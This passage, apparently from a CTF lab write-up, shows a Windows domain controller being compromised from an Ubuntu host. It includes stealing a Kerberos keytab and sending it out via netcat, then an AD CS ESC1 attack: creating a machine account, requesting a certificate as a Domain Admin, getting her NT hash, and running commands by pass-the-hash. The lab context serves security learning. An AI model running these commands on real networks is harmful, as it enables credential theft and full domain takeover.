| b3JpdHkwQgYDVR0RBDswOaAfBgkrBgEEAYI3GQGgEgQQ2h9G/HoggUulVjkhSzV/
| 4oIWQW5vbWFseS1EQy5hbm9tYWx5LmhzbTBPBgkrBgEEAYI3GQIEQjBAoD4GCisG
| AQQBgjcZAgGgMAQuUy0xLTUtMjEtMTQ5Njk2NjM2Mi0zMzIwOTYxMzMzLTQwNDQ5
| MTg5ODAtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEARRqdwM6Rha2xgQ/N/+JxwJax
| gIceINwSDTIITwNI3QB8k0QX+6oPx3JG9oAoNEVBvEbqMl9ooOTvr5u7bMqAYx44
| Rq5EELmjEJZbQYLKVAZOw60kWPJo8x1gz8nDKYT8l2XTKUjiLabKwZFgtxcDs6Xh
| QZrgx5i8uLHkN1Cpoq7ueDhchHH54oUo+IvpVkBazd5SAzN/7Tk9y5hOAbPDa1w2
| JlhjT7LDe4cONBhTlZlTk8DReJrDpNSmjfV8ooRtm3S8O6d0XTyD5g9J93TRp4yT
| MpdSNV6skrldX8GFNOy6eVbsDWAR/MUUfbTdEzsg4UwV5rk77o6TAElLZZ/0OA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126
| rdp-ntlm-info: 
|   Target_Name: ANOMALY
|   NetBIOS_Domain_Name: ANOMALY
|   NetBIOS_Computer_Name: ANOMALY-DC
|   DNS_Domain_Name: anomaly.hsm
|   DNS_Computer_Name: Anomaly-DC.anomaly.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2025-12-18T19:14:45+00:00
| ssl-cert: Subject: commonName=Anomaly-DC.anomaly.hsm
| Issuer: commonName=Anomaly-DC.anomaly.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-20T11:54:59
| Not valid after:  2026-03-22T11:54:59
| MD5:   115d:4b59:a71f:3664:48c0:b4cb:9c65:ce8a
| SHA-1: 8771:7928:b499:d5d2:0830:2da6:ca2b:275b:cb53:6e8f
| -----BEGIN CERTIFICATE-----
| MIIC8DCCAdigAwIBAgIQUg9f7dIcxZREjNiAiITCjTANBgkqhkiG9w0BAQsFADAh
| MR8wHQYDVQQDExZBbm9tYWx5LURDLmFub21hbHkuaHNtMB4XDTI1MDkyMDExNTQ1
| OVoXDTI2MDMyMjExNTQ1OVowITEfMB0GA1UEAxMWQW5vbWFseS1EQy5hbm9tYWx5
| LmhzbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOaCzXY06Ctr8ljX
| p+kZxDoVibTr+o68lfrA2wocRM03P/g3KG8AyP56661OUcbU47fbJ964oKVWrODt
| nWRQgHLePDLkcvl8wduXhHSBep6nK8qLaGobBBqUN/p7CQd17J6qUeCfUo72lnLm
| BI4sNjmNGhsitiYOTqMvF4B/7sue1OuBwrdEuyM7h0jj3/x1aDyMzaMTGHsW9FCO
| 6f743E1EUb6PQ6VAgEMgXM5wspZCKC7bNDboLYxbEkZ9hRN0IhjJ/InyFvY20Uu4
| feb/kbNNU4hzNeB0lja8OCj+FgIHJ9EXxIf/ZlWdIZeyq6YnJ2bZCY6ZSr3bb5TU
| al1HWLkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw
| MA0GCSqGSIb3DQEBCwUAA4IBAQCu4bey/oUJ8OvBtbxQGydNxLV1I19c1LWkJBeP
| DRH8sKo2N1wBe8KPzd1zRqdSIzcWvkPkMgNulOHybpOYrN56AcWpWewEfkFwW5aL
| WrK3cpu4bIyhnxPVoU575og8+SDvAobTuhDWIIzIGm0oqzclWP9BBG2sYkJdiJgY
| a0RGKDzWy4y2RnPxgtBQyna99y6LlBDH4rbqAVZYWOsJkqtUrnBLuEJyMXoRKP40
| 6R8L0apgKTPSOstss0Q+ycQ+PlmYAoNYSMZmwhpJlvnSdkhMBQLRBV7Kfb8ZbCLs
| +MggOo72qRdDLXiiJKxz63SzLzYMQmI7zNDt1ULhzBMpQWa2
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49267/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49684/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49686/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49704/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49758/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.95%I=7%D=12/18%Time=69445267%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02
SF:\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/18%OT=53%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=694452CE%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=105%TI=I%TS=A)
SEQ(SP=FA%GCD=1%ISR=101%TI=I%TS=A)
OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.033 days (since Thu Dec 18 18:27:17 2025)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ANOMALY-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35948/tcp): CLEAN (Timeout)
|   Check 2 (port 57859/tcp): CLEAN (Timeout)
|   Check 3 (port 62123/udp): CLEAN (Timeout)
|   Check 4 (port 45984/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-12-18T19:14:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   114.10 ms 10.200.0.1
2   ...
3   115.91 ms 10.1.121.63

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:15
Completed NSE at 19:15, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.44 seconds
           Raw packets sent: 119 (9.544KB) | Rcvd: 50 (2.688KB)
```

# Pivoting from the Ubuntu Server to the Domain Controller

We know that a Domain Controller exists, so we can hunt for saved keytabs on the Linux machine

```bash
bash-5.2# cat /etc/krb5.keytab
cat /etc/krb5.keytab
J
 ANOMALY.HSM
            Brandon_Boyd �uLR��D��F���+�qoW�&2\▒�N���Rbash-5.2# 

```
We can transfer ```keytab``` file from the victim machine to our attack machine.

Start a listener on the attack machine that writes directly to ```krb5.keytab```
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ nc -lvnp 9999 > krb5.keytab 
```
Then we can ```cat``` the keytab file on the victim machine and send it to our machine using ```nc AttackermachineIP AttackermachinePort```
```bash
bash-5.2# cat /etc/krb5.keytab | nc 10.200.24.96 9999
```
Setup the ```krb5.conf``` file on the attacker machine

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ cat > /tmp/krb5.conf << EOF
[libdefaults]
    default_realm = ANOMALY.HSM
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    ANOMALY.HSM = {
        kdc = 10.1.121.63:88
        admin_server = 10.1.121.63:749
    }

[domain_realm]
    .anomaly.hsm = ANOMALY.HSM
    anomaly.hsm = ANOMALY.HSM
EOF

```
Export ```KRB5_CONFIG=``` to use our newly created ```/tmp/krb5.conf```. (This step is not necessary if you are using the original krb5.conf file present in /etc/krb5.conf). Then request a ticket using the stolen keytab file

```bash
                                                                                                             
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$  export KRB5_CONFIG=/tmp/krb5.conf

┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ kinit -k -t krb5.keytab Brandon_Boyd@ANOMALY.HSM
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ klist                                           
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Brandon_Boyd@ANOMALY.HSM

Valid starting       Expires              Service principal
01/18/2026 19:15:03  01/19/2026 05:15:03  krbtgt/ANOMALY.HSM@ANOMALY.HSM
        renew until 01/19/2026 19:15:02

```
Export ```KRB5CCNAME``` using the path shown in the ```klist``` command, in my case is ```/tmp/krb5cc_1000```, then test the the access with the ccache file
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ export KRB5CCNAME=/tmp/krb5cc_1000 

┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ nxc smb ANOMALY-DC -k --use-kcache 
SMB         ANOMALY-DC      445    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 x64 (name:ANOMALY-DC) (domain:anomaly.hsm) (signing:True) (SMBv1:False)
SMB         ANOMALY-DC      445    ANOMALY-DC       [+] ANOMALY.HSM\Brandon_Boyd from ccache
```

Now we can enumerate users, use bloodhound and find our way to Domain Administrator, which is our goal.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ nxc smb ANOMALY-DC -k --use-kcache --users           
SMB         ANOMALY-DC      445    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 x64 (name:ANOMALY-DC) (domain:anomaly.hsm) (signing:True) (SMBv1:False)
SMB         ANOMALY-DC      445    ANOMALY-DC       [+] ANOMALY.HSM\Brandon_Boyd from ccache 
SMB         ANOMALY-DC      445    ANOMALY-DC       -Username-                    -Last PW Set-       -BadPW- -Description- 
SMB         ANOMALY-DC      445    ANOMALY-DC       Administrator                 2025-09-17 12:01:03 0       Built-in account for administering the computer/domain                                                                                    
SMB         ANOMALY-DC      445    ANOMALY-DC       Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                  
SMB         ANOMALY-DC      445    ANOMALY-DC       krbtgt                        2025-09-21 11:54:56 0       Key Distribution Center Service Account                                                                                                   
SMB         ANOMALY-DC      445    ANOMALY-DC       Brandon_Boyd                  2025-11-12 20:30:05 0       **************                                                                                                                         
SMB         ANOMALY-DC      445    ANOMALY-DC       anna_molly                    2025-11-12 20:29:16 0        
SMB         ANOMALY-DC      445    ANOMALY-DC       [*] Enumerated 5 local users: ANOMALY
```
While enumerating the users, we also find a cleartext password for the user ```Brandon_Boyd```, which we already owned.



# Owning the domain
After using ```bloodhound``` and ```nxc``` to enumerate further, we did not find much apart from the plaintext password of the user which we already own.
Using the plaintext password we can run ```certipy``` to see what certificates exist and if any of them can be exploited to pivot to a different user.

```bash
certipy-ad find -u 'Brandon_Boyd' -p '**************' -dc-ip 10.1.121.63 -text -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'anomaly-ANOMALY-DC-CA-2' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'anomaly-ANOMALY-DC-CA-2'
[*] Checking web enrollment for CA 'anomaly-ANOMALY-DC-CA-2' @ 'Anomaly-DC.anomaly.hsm'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251218214035_Certipy.txt'
[*] Wrote text output to '20251218214035_Certipy.txt'

Certificate Templates
  0
    Template Name                       : CertAdmin
    Display Name                        : CertAdmin
    Certificate Authorities             : anomaly-ANOMALY-DC-CA-2
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 650430 hours
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-21T17:57:59+00:00
    Template Last Modified              : 2025-09-21T17:58:00+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
      Object Control Permissions
        Owner                           : ANOMALY.HSM\Administrator
        Full Control Principals         : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
                                          ANOMALY.HSM\Domain Computers
        Write Owner Principals          : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
                                          ANOMALY.HSM\Domain Computers
        Write Dacl Principals           : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
                                          ANOMALY.HSM\Domain Computers
        Write Property Enroll           : ANOMALY.HSM\Domain Admins
                                          ANOMALY.HSM\Enterprise Admins
    [+] User Enrollable Principals      : ANOMALY.HSM\Domain Computers
    [+] User ACL Principals             : ANOMALY.HSM\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
```

We find the CertificateTemplate called ```CertAdmin```, with certipy disclosing possibly ESC1 and ESC4 as methods for exploitation.
There is 2 users in the Domain Admins group: ```Administrator``` and ```Anna_Molly```, so we decide to focus on Anna_Molly as the Administrator user shows as ```Disabled``` on bloodhound.
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Anomaly/Anomaly2.png?raw=true)
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Anomaly/Anomaly4.png?raw=true)

As we can see in the Certipy [wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation), ESC1 Privesc tells us that 
"ESC1 is the stereotypical AD CS misconfiguration that can lead directly to privilege escalation. The vulnerability arises when a certificate template is inadequately secured, permitting a low-privileged user to request a certificate and, importantly, specify an arbitrary identity within the certificate's SAN. This allows the attacker to impersonate any user, including administrators."

We already know that ```Enrollee Supplies Subject``` equals ```True``` for the CertAdmin template but the ```User Enrollable Principals``` is ```Domain Computers```, so we need to check if the user Brandon_Boyd can create computer accounts, which it can.

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ nxc ldap 10.1.121.63 -u 'Brandon_Boyd' -p '**************' -M maq
LDAP        10.1.121.63     389    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 (name:ANOMALY-DC) (domain:anomaly.hsm)
LDAPS       10.1.121.63     636    ANOMALY-DC       [+] anomaly.hsm\Brandon_Boyd:************** 
MAQ         10.1.121.63     389    ANOMALY-DC       [*] Getting the MachineAccountQuota
MAQ         10.1.121.63     389    ANOMALY-DC       MachineAccountQuota: 10
```

First step is create a new computer account

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ certipy-ad account create -u 'brandon_boyd@anomaly.hsm' -p '3edc4rfv#EDC$RFV' -user 'EVILPC3' -dc-ip 10.1.121.63
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Creating new account:
    sAMAccountName                      : EVILPC3$
    unicodePwd                          : tPJihEn8i1Uc4vH2
    userAccountControl                  : 4096
    servicePrincipalName                : HOST/EVILPC3
                                          RestrictedKrbHost/EVILPC3
    dnsHostName                         : evilpc3.anomaly.hsm
[*] Successfully created account 'EVILPC3$' with password 'tPJihEn8i1Uc4vH2'
```
Then identify the SID of the target user, this is visible on the user information tab on bloodhound
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Anomaly/Anomaly3.png?raw=true)

Next, using the computer account we request the a certificate from the vulnerable CertAdmin template adding Anna_Molly ```UPN``` and ```SID``` as per certipy wiki documentation (ESC1).

```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ certipy req -u 'EVILPC3$@anomaly.hsm' -p 'tPJihEn8i1Uc4vH2' -dc-ip 10.1.121.63 -target 10.1.121.63 -ca 'anomaly-ANOMALY-DC-CA-2' -template 'CertAdmin' -upn 'anna_molly@anomaly.hsm' -sid 'S-1-5-21-1496966362-3320961333-4044918980-1105' 

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 33
[*] Successfully requested certificate
[*] Got certificate with UPN 'anna_molly@anomaly.hsm'
[*] Certificate object SID is 'S-1-5-21-1496966362-3320961333-4044918980-1105'
[*] Saving certificate and private key to 'anna_molly.pfx'
[*] Wrote certificate and private key to 'anna_molly.pfx'
```

Now we can use the certificate to request the user's NT hash and we own the domain, can connect to the DC as the Domain Admin and collect the root flag!
```bash
┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ certipy auth -pfx anna_molly.pfx -dc-ip 10.1.121.63
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'anna_molly@anomaly.hsm'
[*]     SAN URL SID: 'S-1-5-21-1496966362-3320961333-4044918980-1105'
[*]     Security Extension SID: 'S-1-5-21-1496966362-3320961333-4044918980-1105'
[*] Using principal: 'anna_molly@anomaly.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'anna_molly.ccache'
[*] Wrote credential cache to 'anna_molly.ccache'
[*] Trying to retrieve NT hash for 'anna_molly'
[*] Got hash for 'anna_molly@anomaly.hsm': aad3b435b51404eeaad3b435b51404ee:*************

┌──(Kyd0s㉿kali)-[~/HackSmarter/Anomaly]
└─$ nxc smb ANOMALY-DC -u 'anna_molly' -H 'aad3b435b51404eeaad3b435b51404ee:*************' -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.1.121.63     445    ANOMALY-DC       [*] Windows 11 / Server 2025 Build 26100 x64 (name:ANOMALY-DC) (domain:anomaly.hsm) (signing:True) (SMBv1:False)
SMB         10.1.121.63     445    ANOMALY-DC       [+] anomaly.hsm\anna_molly:************* (Pwn3d!)
SMB         10.1.121.63     445    ANOMALY-DC       [+] Executed command via wmiexec
SMB         10.1.121.63     445    ANOMALY-DC       *************

```
![alt text](https://github.com/Kyd0s/Kyd0s.github.io/blob/main/assets/Anomaly/Anomaly5.png?raw=true)
Enjoy!
